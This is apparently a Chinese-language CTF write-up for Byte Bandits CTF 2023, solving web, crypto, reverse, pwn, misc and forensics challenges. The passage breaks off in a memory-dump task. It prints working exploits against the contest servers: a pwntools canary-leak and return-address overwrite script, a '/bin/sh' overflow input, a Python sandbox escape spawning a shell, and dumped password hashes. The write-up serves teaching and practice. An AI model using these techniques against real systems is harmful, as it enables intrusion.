# Byte Bandits CTF 2023
###### tags: `CTF`

## (No Title)
### Welcome To BBCTF
```!
How many times do i have to tell? GET THE FLAG You Know Where

https://discord.gg/3XdGKMe929
```

discord -> events/bbctf -> 標題

`flag{s4N1ty_ChkS_ar3_100_ComM0n}`

### Survey
```
Kindly fill out this survey
```
附件: `https://forms.gle/yjXMvGsjGj5ySfaU8`

填問卷

`flag{h0pE_y0u_H4D_4_Gr3A7_7IM3}`

## Web
### Improper Error Handling

```!
This website is giving errors. Can you figure it out ?
```
附件: `web.bbctf.fluxus.co.in:1001`

網頁內是一個輸入密碼的程式，嘗試輸入密碼

![](https://i.imgur.com/kP6GQWA.png)

發現在任意輸入下，會發生 `Error: Length too short` 的錯誤，首先用試誤法嘗試找到密碼可行的長度

在網頁原始碼中發現是將長度送給 `/api/error?length=???` 的 endpoint，但看起來沒有實際檢查密碼的地方?，因此推測只要長度對了就能拿到 flag

```javascript=
function sendRequest() {
      let length = document.getElementById("input").value;
      fetch("/api/error?length=" + length)
        .then(response => response.text())
        .then(text => {
          if (text.startsWith("Error")) {
            document.getElementById("error-message").textContent = text;
            document.getElementById("error-message").style.display = "block";
            document.getElementById("debug-message").style.display = "none";
          } else {
            document.getElementById("debug-message").textContent = text;
            document.getElementById("debug-message").style.display = "block";
            document.getElementById("error-message").style.display = "none";
          }
        });
    }
```

發現在當長度介於 `10000000000000000000000000000000` ~ `90000000000000000000000000000000` 時，就會噴出 flag，而超過這個範圍後要馬輸出 `Error: Length too short` 要馬就是輸出一些奇怪的 base64 字串，反正有 flag 了不管他

http://web.bbctf.fluxus.co.in:1001/api/error?length=10000000000000000000000000000000

```!
Congratulations! You found the flag: BBCTF{tHis_i5_1t_Y0u_CraCk3D_iT}
```

`BBCTF{tHis_i5_1t_Y0u_CraCk3D_iT}`

### Hi-Score
```!
Reach 100 clicks per second for a reward.
```
附件: `chal.bbctf.fluxus.co.in:1003`

點進去網頁後，有一個可以點的地方，需要我們達到每秒 100 個點擊的速度

![](https://i.imgur.com/tMCHhq6.png)

觀察原始碼，發現基本上就是每點一次就會呼叫一次 `Click()` 函式，所以我們可以直接用 js 的方式自動呼叫此函式

```htmlembedded=
<body>
    <p id="head">i-CLICK MASTER</p>

    <div id="stats">
        <p id="clicks">SCORE: 0 cps</p>
        <p id="hiscore">Hi-SCORE : 100 </p>
    </div>
    <div id="playarea" onclick="Clicks()">
        <p id="arena" > CLICK ME</p>
    </div>
    <div id="btn">
        <button id="reset" onclick="Reset()"> RESET </button>
    </div>
    <div id="message">
        <p id="intro">Reach 100 clicks per second for a reward</p>
        <p id="reward"></p>
    </div>
</body>
```

以下程式丟到 console 執行

```javascript=
for(let i=0; i<1000; i++){ Clicks(); }
```

拿到 reward，為 `http://chal.bbctf.fluxus.co.in:1003/.secretion/flag`，裡面就是 flag

這題我猜應該也可以去嘗試 prettify js 直接讀原始碼

`flag{THAtS_15_A_SM4rT_m0ve}`

### Hash Browns
```
twist, lick, dunk and trail
```
附件: `web.bbctf.fluxus.co.in:1004`
提示:
![](https://i.imgur.com/quDOQa6.png =200x)

由提示來看，這題跟 tor 有關

打開網頁後，發現只有 `You Have Been Fooled` 的字樣，沒有其他東西了

在使用 curl 做相關查看時，發現有給一個 cookie 叫 `garlic` (薑)，並帶有奇怪的字串，但 base64 之類的解不出來

```
Set-Cookie: garlic=cmztpaurxxnoqz3p2on73msbohg5sk74l2fxnxp27gky6cdjqzqq6nad; Path=/
```

通過提示猜測這是 onion address，嘗試改用 tor 並把它後面加上 `.onion`，嘗試連接它

成功連接，但是只有顯示 `Null Byte`，但在網頁原始碼中發現了 flag

```htmlembedded=
<script>console.log("flag{Y0U_H4V3_B33N_W4RN3D}")</script>
<html>
<body>
Null Byte
</body>
</html>
```

`flag{Y0U_H4V3_B33N_W4RN3D}`

## Crypto
### Crypto Masquerade
```
The truth is hidden in the shadows, masked by a facade of deception. Peel back the layers and look deeper to reveal the truth.
```
附件: `nc crypto.bbctf.fluxus.co.in 3001`, `chal.py`

:::spoiler chal.py
```python=
import base64
import random
import math

from Crypto.Util import number
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

BIT_L = 2**8

with open("flag.txt", "r") as f:
    FLAG = f.read()


def generate_secrets():
    p = number.getPrime(BIT_L)
    g = number.getPrime(BIT_L)
    h = (p - 1) * (g - 1)
    a = 0
    while number.GCD(a, h) != 1:
        a = number.getRandomRange(3, h)
    b = pow(a, -1, h)
    return p * g, g, a, b


def main():
    p, g, a, b = generate_secrets()

    A = pow(g, a, p)
    B = pow(g, b, p)
    key = pow(A, b, p)

    print("p :", p)
    print("g :", g)
    print("A :", A)
    print("B :", B)
    print("key :", key)
    assert key == g

    password = key.to_bytes((key.bit_length() + 7) // 8, "big")
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256,
        length=32,
        salt=b"\x00" * 8,
        iterations=100000,
        backend=default_backend(),
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f = Fernet(key)
    token = f.encrypt(FLAG.encode("ascii"))

    print("message : ", token.decode())


if __name__ == "__main__":
    main()
```
:::

ㄜ，就第 52 行的 f.encrypt 改成 f.decrypt 就行了，前面參數就拿 server 生出來ㄉ

:::spoiler solve.py
```python=
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

key = 82945735284727473782309905688799016323809425340888034991741643523640985923783
flag_enc = "gAAAAABj3iarC_xaE5c0-oq3RFczT8ohg6MAffOjRcTuzeHjfhD7K0iKaygg-JVnh-bzG4xTuQDzb94PDG-2vucuOgaO9SBpF4fuijrg_HRK0Fe0HuM3evKzBNMQ1sVoiADvYXNXwmCR"

password = key.to_bytes((key.bit_length() + 7) // 8, "big")
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256,
    length=32,
    salt=b"\x00" * 8,
    iterations=100000,
    backend=default_backend(),
)
key = base64.urlsafe_b64encode(kdf.derive(password))
f = Fernet(key)
flag = f.decrypt(flag_enc.encode("ascii"))

print("flag : ", flag.decode())
```
:::

`flag{wA17_1tS_all_rs4?_Alw4ys_H4S_b33N}`

### Visionary Cipher
```!
It's a new innovative kind of cipher.
```
附件: `nc crypto.bbctf.fluxus.co.in 3002`, `chal.py`

:::spoiler chal.py
```python=
from string import ascii_lowercase, digits
from random import choices
from hashlib import md5

with open("flag.txt", "r") as f:
    FLAG = f.read()

alphabets = ascii_lowercase + digits + "_{}"
key = "".join(choices(alphabets, k=10))


def pos(ch):
    return alphabets.find(ch)


def encrypt(text, key):
    k, n, l = len(key), len(text), len(alphabets)
    return "".join([alphabets[(pos(text[i]) + pos(key[i % k])) % l] for i in range(n)])


print("c :", encrypt(FLAG, key))
print("hash :", md5(FLAG.encode("ascii")).hexdigest())
```
:::

可以看到，這題基本上就是 vigenere 的改版，另外由於 flag 開頭已知，所以可以達成已知明文攻擊

由於 flag 開頭已知可能是 `flag{` 或 `bbctf{`，因此也可利用加減法推算出 key 的開頭部分，另外由於 flag 結尾固定為 `}`，所以可另外推回一部分的 key 資訊

剩下不知道的部分就使用 bruteforce 的方式慢慢推出來

:::spoiler solve.py
```python=
# flag{: 8j6nf??7??
# bbctf{: }t4a{i?7??
c = "au6tdgo49b5qwkfvboncg73zjkunt9wpw0j__6"
hash = "17382b1a9caad37bd127f2a7984ccbb9"

from itertools import permutations
from hashlib import md5
from string import ascii_lowercase, digits

alphabets = ascii_lowercase + digits + "_{}"

def pos(ch):
    return alphabets.find(ch)

def decrypt(text, key):
    k, n, l = len(key), len(text), len(alphabets)
    return "".join([alphabets[(pos(text[i]) - pos(key[i % k])) % l] for i in range(n)])

perm = permutations(alphabets, 4)
for p in perm:
    key = "8j6nf" + p[0] + p[1] + "7" + p[2] + p[3]
    flag = decrypt(c, key)
    if(md5(flag.encode("ascii")).hexdigest() == hash):
        print(flag)
        print(f"{key = }")
        exit(0)
print("not found")
```
:::

這邊我假設 flag 開頭為 `flag{`

這邊的 key 推出來為 `8j6nfth7wo`

`flag{0h_n0_h3_ac7u41ly_me4nt_v1g3ner3}`

## Reverse
### ez-pz-xor
```
The basic idea behind XOR – encryption is, if you don’t know the XOR-encryption key before decrypting the encrypted data, it is impossible to decrypt the data.

Looks like a simple xor cipher.
```
附件: `nc pwn.bbctf.fluxus.co.in 4003`, `ez-pz_xor.zip`

<!-- 這題有夠 G8 ㄉ -->

首先丟進 ghidra 分析，以下是 main 函式

```clike=
undefined8 main(void)

{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  ulong local_b8;
  long local_b0;
  ulong local_a8 [8];
  char local_68 [72];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  puts("password pls, no brute forcing:");
  fgets((char *)local_a8,0x40,stdin);
  local_b8 = xor_key ^ local_a8[0];
  local_b0 = (long)local_b8 >> 0x3f;
  sleep(0);
  iVar1 = strcmp((char *)&local_b8,"password");
  if (iVar1 == 0) {
    __stream = fopen("flag.txt","r");
    fgets(local_68,0x40,__stream);
    fclose(__stream);
    printf("nice work, here\'s the flag! %s",local_68);
  }
  else {
    puts("that aint it dawg\n");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
```

可以看到，基本上就是將輸入做 xor 加密後比對是否等同於 `password` 字串，是的話就給 flag

而用 ghidra 檢查出來的 `xor_key` 是 0x0539053905390539 (注意因為是 little endian，所以事實上是對每個字元分別做 `39 05 39 05 39 05 39 05` 的 xor)，因此對 `password` 字串做 xor 逆回來即可得到輸入，就是這麼簡單，小學生都會

:::spoiler solve_failed.py
```python=
from pwn import xor
print(xor(b"password", bytes.fromhex("3905390539053905")))
```
:::

得出的 key 是 `IdJvNjKa`，丟進去就能拿 flag 了?

才怪

經過嘗試後，發現在 debugger 如 gdb 下能成功，但是一般執行失敗，所以推測程式有做某種程度的 anti-debugger

經過發現，在函式 `__do_global_ctors_aux` 發現以下 code (以下是 ida 的結果因為 ghidra 逆出來的 syscall 部分壞掉了)

```clike=
signed __int64 __fastcall _do_global_ctors_aux()
{
  unsigned __int64 v0; // r10
  signed __int64 result; // rax
  int i; // [rsp+0h] [rbp-1Ch]
  _QWORD *v3; // [rsp+4h] [rbp-18h]

  result = sys_ptrace(0LL, 0LL, 0LL, v0);
  if ( (_DWORD)result != -1 )
  {
    for ( i = 0; i <= 255; i += 8 )
    {
      v3 = (_QWORD *)(i + ((unsigned __int64)_do_global_ctors_aux & 0xFFFFFFFFFFFFF000LL) + 0x3000);
      if ( (*(_QWORD *)(i + ((unsigned __int64)_do_global_ctors_aux & 0xFFFFFFFFFFFFF000LL) + 0x3000) ^ 0x9D56D68360D417FDLL) == 0x986FD3BA65ED12C4LL )
        break;
    }
    result = (signed __int64)v3;
    *v3 ^= 0x119011901190119uLL;
  }
  return result;
}
```

可以看到其中會檢查目前有沒有 debugger 正在追蹤，沒有的話會對數值再做一次的 xor 加密

因此我們的程式腳本應該修改如下

:::spoiler solve.py
```python=
from pwn import xor
print(xor(b"password", xor(bytes.fromhex("3905390539053905"), bytes.fromhex("1901190119011901"))))
```
:::

解出來的密碼為
```
PeSwWkR`
```

丟進去原程式拿 flag

`flag{x0R_8ut_wi7h_4_5l1gh7_tw1s7!!}`

## Pwn
### Easy pwn
```!
Easy memory corruption challenge.
```
附件: `nc pwn.bbctf.fluxus.co.in 4001`, `ez_pwn.zip`

首先先用 checksec 來觀察，發現基本上保護都是開的，初步看起來有點棘手

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

但實際丟到 ghidra 看之後，發現漏洞滿明顯的，以下是 ghidra 反編出來的程式

```clike=
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_30 [8];
  undefined2 local_28;
  undefined local_26;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = 0x736c;
  local_26 = 0;
  puts("Hi! would you like me to ls the current directory?");
  read(0,local_30,0x18);
  iVar1 = strcmp(local_30,"no\n");
  if (iVar1 == 0) {
    puts("Oh, ok :(");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Ok, here ya go!\n");
  system((char *)&local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

其中的 `local_30` 是一個長度為 8 的陣列，但是第 15 行卻給我們 0x18 的可寫入長度，導致我們可以 BOF

而再來看，程式會把 `local_28` 作為 system 函式的輸入，而其剛好是 `local_30` 的後面，因此只要我們覆蓋掉 `local_30` 的 8 個空間之後就能覆蓋 `local_28` 的內容，因此我們能蓋成 `/bin/sh` 並給 system 作為輸入，即可成功 RCE

總之，以下是輸入

```
aaaaaaaa/bin/sh
```

`flag{4_Cl45siC_M3mOry_COrrupt1ON}`

### Medium pwn
```!
Can you fool the Stack oracle?
```
附件: `nc pwn.bbctf.fluxus.co.in 4002`, `medium_pwn.zip`

首先使用 checksec 檢查保護，一樣這題是全開的

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

丟到 ghidra 觀察，可以看到在 main 中會一直 call `gimme_pointer` 這個函式

```clike=
void main(void)

{
  puts("Hi! I am the Stack Oracle.\n");
  do {
    gimme_pointer();
  } while( true );
}
```

而 `gimme_pointer` 這個函式會告訴我們目前會寫入的 stack 位置，並要求我們提供一個記憶體位置給他，他會回傳 8 bytes 該記憶體的內容

```clike=
void gimme_pointer(void)

{
  long in_FS_OFFSET;
  undefined8 local_30;
  undefined local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("You are here: %p\n Give me an address and I will grant you 8 leaked bytes:\n",local_28) ;
  read(0,local_28,0x40);
  hex_string_to_byte_array(local_28,&local_30,0x10);
  printf("Here are the contents of %p:\n",local_30);
  print_buf(local_30,8);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

而可以清楚的觀察到 `local_28` 是一個長度為 24 位的陣列，但是可以寫入 0x40 個內容，明顯的 BOF

另外可以觀察到有一個位在 0x001008f7 (有 PIE) 的 `this_function_literally_prints_the_flag` 函式，會讀取 flag.txt 的內容並輸出出來

因此我們可以利用該程式的功能讀取 canary (目前位置 +0x18) 和 return address (目前位置 +0x28)，即可繞過 canary 和 PIE 防護，達到 ROP 執行印 flag 的函式

:::spoiler solve.py
```python=
from pwn import *
from Crypto.Util.number import long_to_bytes
binary = "./dist/ez-pwn-2"

def process_retval(data: bytes) -> bytes:
    ret = b""
    for i in range(len(data)-2, -1, -2):
        ret += data[i:i+2]
    return ret

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("pwn.bbctf.fluxus.co.in", 4002)
# conn = process(binary)
# conn = gdb.debug(binary)

conn.recvuntil(b"You are here: 0x")
current_pos = int(conn.recvline().strip().decode(), base=16)
log.info(f"current_pos = 0x{long_to_bytes(current_pos).hex()}")

conn.sendafter(b"8 leaked bytes:\n", long_to_bytes(current_pos+0x18)[::-1].hex().encode())
conn.recvline()
canary = process_retval(conn.recvline().strip()).decode()
log.info(f"{canary = }")

conn.sendafter(b"8 leaked bytes:\n", long_to_bytes(current_pos+0x28)[::-1].hex().encode())
conn.recvline()
pie_base = int(process_retval(conn.recvline().strip()), base=16)
log.info(f"pie_base = 0x{long_to_bytes(pie_base).hex()}")

flag_func = pie_base - 0xa21 + 0x8f7

payload = long_to_bytes(current_pos+0x18)[::-1].hex().encode()
payload += b"\x00" * (0x18 - len(payload))
payload += bytes.fromhex(canary)[::-1]
payload += b"A" * 8
payload += p64(flag_func)
conn.sendafter(b"8 leaked bytes:\n", payload)

conn.interactive()
```
:::

要留意的是位置的輸入是反過來來輸入 (0x1234 要輸入 3412)，不確定是不是題目設計不良

`flag{che471n9_s7acK_0raC1E}`

## Misc
### Peer Pressure
```
Don't let them get into your mind
```
附件: `web.bbctf.fluxus.co.in:1002`

網頁連進去之後，只有一個按鈕，點了會到 rickroll

![](https://i.imgur.com/gTxU2oX.png)

查看網頁原始碼，發現是先導到 `/aGVhZA==` 的 endpoint，之後才被 redirect 到 rickroll

```htmlembedded=
<body>
    <form action="/aGVhZA==" method="GET">
        <button type="submit">Click Here</button>
    </form>

</body>
```

而這個 endpoint 看起來很像 base64，解碼後得到 `head` 字樣，另外用 http OPTIONS 查看後發現有 HEAD 的 method，推測是要我們使用 HEAD method

```bash
curl -v -X HEAD http://web.bbctf.fluxus.co.in:1002/aGVhZA==
```

發現裡面有一個叫 png 的 header，且內容看起來是 base64，使用 cyberchef 解碼，得出以下圖片

```!
png: iVBORw0KGgoAAAANSUhEUg ...(中間省略)... bui3xUegL3AAAAABJRU5ErkJggg==
```

![](https://i.imgur.com/yybZjqX.png)

猜測接下來是 stego，使用 zsteg，發現 flag
```
meta Comment        .. text: "flag{D0_N0T_G3T_PR355UR3D}"
```

`flag{D0_N0T_G3T_PR355UR3D}`

### Tree of Secrets
```!
The message is encoded in the whispers of the wind, buried deep in the roots of a tree. Uncover the secret by listening to the silence between the lines and exploring the branches.
```
附件: `message`, `root.zip`

:::spoiler message
```!
00011000110011110000000100110000101011001111100000111101011010101101000010111100110100101001101001010001101111111111111111010111010001001
```
:::

root.zip 是一包資料夾為 0 和 1 的 zip，以下是 tree 後的內容

:::spoiler root
```
.
├── 0
│   ├── 0
│   │   ├── 0
│   │   │   └── R
│   │   └── 1
│   │       ├── 0
│   │       │   └── 3
│   │       └── 1
│   │           └── U
│   └── 1
│       ├── 0
│       │   ├── 0
│       │   │   ├── 0
│       │   │   │   └── m
│       │   │   └── 1
│       │   │       └── Z
│       │   └── 1
│       │       └── d
│       └── 1
│           ├── 0
│           │   ├── 0
│           │   │   └── t
│           │   └── 1
│           │       └── z
│           └── 1
│               ├── 0
│               │   └── i
│               └── 1
│                   └── G
├── 1
│   ├── 0
│   │   ├── 0
│   │   │   ├── 0
│   │   │   │   └── F
│   │   │   └── 1
│   │   │       └── 9
│   │   └── 1
│   │       ├── 0
│   │       │   └── I
│   │       └── 1
│   │           ├── 0
│   │           │   └── S
│   │           └── 1
│   │               └── V
│   └── 1
│       ├── 0
│       │   ├── 0
│       │   │   ├── 0
│       │   │   │   └── k
│       │   │   └── 1
│       │   │       └── x
│       │   └── 1
│       │       └── X
│       └── 1
│           ├── 0
│           │   ├── 0
│           │   │   └── B
│           │   └── 1
│           │       └── T
│           └── 1
│               └── 0
```
:::

由題目推測，是要我們根據 message 的內容依序 traverse root 資料夾的內容，當執行到葉節點時的檔案名稱就是 flag 的內容 (就是 huffman tree 啦)

:::spoiler solve.py
```python=
import os

with open("message") as fh:
    data = fh.read()

flag = ""
traverse = "."
for d in data:
    if(d == "0"):
        traverse += "/0"
    else:
        traverse += "/1"
    if(len(os.listdir(traverse)) != 2):
        flag += os.listdir(traverse)[0]
        traverse = "."
print(flag)
```
:::

解出來是 base64 字串，解碼後就是 flag

另外有一個 bug 是開頭的 flag 被大寫了，需要手動改回小寫

`flag{wHaT_7HE_HuFf_M4N!}`

### Virus Attack
```
One day they woke me up, so I could live forever But immortality's a curse, now forever I'll endure
```
附件: `nc misc.bbctf.fluxus.co.in 2001`

這題是一個 pyjail 題

經過初步嘗試，發現有一些字像是 `S`, `1`, `system` 之類的沒辦法使用，另外也不能使用像是 `import`, `__import__`, `eval`, `exec` 之類的，也沒辦法賦值給變數

上網搜尋一下找 pyjail 相關經驗，發現[這篇文章](https://zhuanlan.zhihu.com/p/578986988#:~:text=calc_jail_beginner_level1)，並嘗試利用其的 payload，如下

```python
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['sys'+'tem']('sh')
```

其中由於 `system` 字串被黨的關係，所以要改寫成串接的形式

flag 在同目錄下的 flag.txt

順便補個 leak 出來的 source code，看後面有沒有大大有想出其他解法

:::spoiler chal.py
```python=
#!/usr/bin/env python3

BLOCKED = ["getattr", "eval", "exec", "breakpoint", "lambda", "help"]
BLOCKED = {func: None for func in BLOCKED}
BLOCKED['STATUS'] = 1

welcome='''
Please, stop this virus, he changed my environment


█░█░█ █▀▀ █░░ █▀▀ █▀█ █▀▄▀█ █▀▀
▀▄▀▄▀ ██▄ █▄▄ █▄▄ █▄█ █░▀░█ ██▄                 but,

█▄█ █▀█ █░█   █▀▀ ▄▀█ █▄░█ ▀█▀   █▀▄ █▀▀ █▀▀ █▀▀ ▄▀█ ▀█▀   █▀▄▀█ █▀▀
░█░ █▄█ █▄█   █▄▄ █▀█ █░▀█ ░█░   █▄▀ ██▄ █▀░ ██▄ █▀█ ░█░   █░▀░█ ██▄

'''

print(welcome)

while True:
        BLOCKWORDS = ['builtins','setattr','getattr','system','import','read','S','subprocess','lower','dict','os','upper','1','8']
        if BLOCKED['STATUS']==0:
                flag=open('flag.txt','r')
                print(flag.read())
                break

        c = input('>>> ')
        BAD=""
        for i in BLOCKWORDS:
                if i in c:
                        BAD=i

        if BAD!="":
                print("Sorry You cant write",BAD)

        else:
                try:
                        print(eval(c,BLOCKED))
                except Exception as e:
                        print("Useless Move, lol")
```
:::

`flag{S0_YoU_KN0W_How_70_m0d1fy_vARi@bl35_1n_Py}`

### Meaning of Life
```
Senpai, what is the meaning of life ?
```
附件: `misc.bbctf.fluxus.co.in:2002`

這題我是矇出來ㄉ

在連結網頁中，只有一個輸入數字的文字框，輸入後會在下面的 Hash value 輸出一個 base64 的字串

![](https://i.imgur.com/gEB416S.png)

在一般情況下，只會輸出像是以下這樣的 base64 字串，裡面是 rickroll 的你輸入秒數為開頭的連結

```
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUSZ0PTFz
```

這邊我嘗試爆破看看有沒有特別的數字會出現其他連結

:::spoiler solve.py
```python=
import requests
import time

for i in range(1,213):
    res = requests.post("http://misc.bbctf.fluxus.co.in:2002/", data={"key_num": str(i)})
    try:
        text = res.text.split("</b>")[1].split("</p>")[0]
    except:
        text = res.text
    print(i, res.status_code, text)
    time.sleep(2)
```
:::

裡面的 213 是因為 rickroll 最長只有 213 秒

在爆破到 `i=42` 秒時，發現連結變成 https://www.youtube.com/watch?v=FIUbRJkKjlE ，裡面聽起來是摩斯密碼

```
-.-. .. -.-. ....- -.. ....- ..-. .-.. .. ...-- .....
```

解碼後變成 `CIC4D4FLI35`

結合影片標題，flag 如下

`flag{CIC4D4FLI35}`

### (X) The Unforgiving Jungle
```!
So I am lost in woods near Hotasita City, help me get out? I am giving you my state.

Note: You will find the flag broken into words, join them with _ to get the flag. 'HELLO' and 'wOrld' will give the flag as flag{HELLO_wOrld}
```
附件: `state.sav`

上網搜尋一下 `.sav` 檔案，發現似乎是遊戲的儲存檔案，另外由題目的 `Hotasita City` 進行搜尋發現是 Pokemon 相關

使用 PXHeX 來開存檔，在右側的 box 選單可以看到 FLAG 5~7 的選項，推測代表 flag 是 box 5~7 的名稱

![](https://i.imgur.com/fEUs8lW.png)

照格式拼起來後，得到 flag

`flag{CH347ing_Giv3s_BADegg}`

## Forensics
### Vastness of Space
```!
Is space really that empty?
```
附件: `Empty_Space.jpg`

拿到一個 jpg 檔案，並發現檔案內容似乎有點大，推測裡面可能有藏檔案

初步使用 binwalk，但是沒有發現藏有可疑檔案

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
```

使用 exiftool，發現有一欄 `XP Comment`，並附有 password 資訊

```
XP Comment                      : The password is "BBCTF"
```

使用 steghide，萃取出 `somedata.txt`，裡面是一堆座標資訊

```
11,8
11,9
11,10
11,11
11,12
... 中間省略 ...
184,176
184,177
184,178
184,179
184,180
```

推測這些座標組合起來可能能拚成文字，使用 matplotlib 畫圖

:::spoiler solve.py
```python=
import matplotlib.pyplot as plt

with open("somedata.txt") as fh:
    points = fh.readlines()

x, y = [], []
for p in points:
    xx,yy = p.strip().split(",")
    x.append(int(xx))
    y.append(int(yy))

plt.scatter(x,y)
plt.savefig("out.png")
```
:::

不過輸出的不是文字，而是一個看起來很像是 QRcode 的東西

![](https://i.imgur.com/uPKJQxL.png)

掃描後得到 flag

`flag{qUiCk_R3sP0nse_c0d3}`

### Imageception
```
"The painter has the universe in his mind and hands." -Leonardo Da Vinci
```
附件: `https://drive.google.com/drive/folders/1mkC2FP3NHUwANaz2f_ie-pha7L4PtACm?usp=share_link`

連結內是一個 .raw 檔案，由題目敘述、類型、大小等推測可能是 memory dump，使用 volatility 嘗試讀內容

首先使用 windows.info 確認確實是一個 memory dump 檔案 (並且做一下快取)

```bash
python ~/volatility3/vol.py -f imageception.raw windows.info
```

確認能讀到東西

接著讀取一些資訊之後，沒看到太特別的東西，而後用 hashdump 檢查有哪些使用者以及他們的 hash

```bash
python ~/volatility3/vol.py -f imageception.raw windows.hashdump
```
```
Volatility 3 Framework 2.4.0

User	rid	lmhash	nthash

Administrator	500	aad3b435b51404eeaad3b435b51404ee	6597d9fe8469e21d840e2cbff8d43c8b
Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	f143bfc641e91b0f569a1882fafb1250
bbctf	1000	aad3b435b51404eeaad3b435b51404ee	6597d9fe8469e21d840e2cbff8d43c8b
```

確認有一個使用者 `bbctf`，可能是當前的使用者帳號，另外裡面的 hash 能用 hashstation 破解成 `changeme` 但在這題基本上沒有用

接者使用 filescan 看有哪些檔案，並配合 vscode 的搜尋功能找 `bbctf` 使用者底下的檔案，發現在他的桌面上有一個 `imageception.png`，看起來非常可疑

```bash
python ~/volatility3/vol.py -f imageception.raw windows.filescan
```
```
... 省略
0xa08f6ca23200	\Users\bbctf\Desktop\imageception.png	216
... 省略
```

使用 dumpfiles，取出檔案

```bash
python ~/volatility3/vol.py -f imageception.raw -o files windows.dumpfiles --virtaddr 0xa08f6ca23200
```

得出以下圖片檔，即為 flag

![](https://i.imgur.com/515fj4S.png =400x300)

`flag{!m@g3_w1tHin_1M4ge}`

### Random Requests
```
I captured these very random http requests. Can you help me decode them?
```
附件: `random_requests.pcapng`

給了一個 pcap 檔案，使用 wireshark 打開

檢查 protocol hierarchy，發現有 HTTP 的東西，進行 filter

![](https://i.imgur.com/UKiWjDC.png)

看起來這些 http 都是同一個人發的，且都會去 traverse `/flag=?` 的 endpoint，看起來像是 binary 格式

![](https://i.imgur.com/nSz1gtD.png)

使用 pyshark 分析萃取出 binary 帶有的文字

:::spoiler solve.py
```python=
import pyshark

cap = pyshark.FileCapture('./random_requests.pcapng', display_filter="http and ip.src==10.0.2.15")

flag = ""
bits = ""
ct = 0
i = 0
for packet in cap:
    route = packet.http.get_field("request_uri")
    b = route.split("=")[1]
    if(b == "%20"):
        flag += chr(int(bits, 2))
        bits = ""
        ct = 0
    else:
        if(ct >= 8):
            break
        bits += b
        ct += 1
    i += 1
flag += chr(int(bits, 2))
print(flag)
```
:::

得到文字 `ZmxhZ3tuT1RfU29fcjRuZG9tX2g3N3BfcjNxdTM1dHN9`，看起來像是 base64，解碼後拿到 flag

`flag{nOT_So_r4ndom_h77p_r3qu35ts}`

### (X) Memory Dump
```!
I was learning powershell when my pc suddenly crashed. Can you retrieve my bash history? Download link:
```
附件: `https://drive.google.com/drive/folders/1igAY42dIA-xrGMLH5_NVdq5nisVG4YLa?usp=share_link`

跟 Imageception 那題一樣，拿到一個 memory dump 檔案

由於題目有說是要 powershell 的 history，上網搜尋了一下後發現這個紀錄似乎是存在檔案中，[參考連結](https://stackoverflow.com/a/44104044)

可以透過以下 ps 指令取得儲存的位置

```shell
(Get-PSReadlineOption).HistorySavePath
```

預設會是儲存在以下位置
```
(使用者家目錄)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

嘗試使用 volatility 的 filescan 功能，並搭配 grep 的篩選功能，找到可疑的檔案

```bash
python ~/volatility3/vol.py -f ./Memdump.raw windows.filescan | grep ".txt"
```
```
0xc88f21961af0  \Users\bbctf\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt    216
0xc88f2388b3b0  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\english_wikipedia.txt    216
0xc88f2388ccb0  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\female_names.txt 216
0xc88f23892a70  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\EADPData Component\4.0.2.3\data.txt 216
0xc88f23893560  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\male_names.txt   216
0xc88f2389a2c0  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt    216
0xc88f24615760  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\surnames.txt     216
0xc88f24622be0  \Users\bbctf\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\us_tv_and_film.txt       216
```

可以看到第一個可能就是我們要的檔案

使用 dumpfiles 取出該檔案

```bash
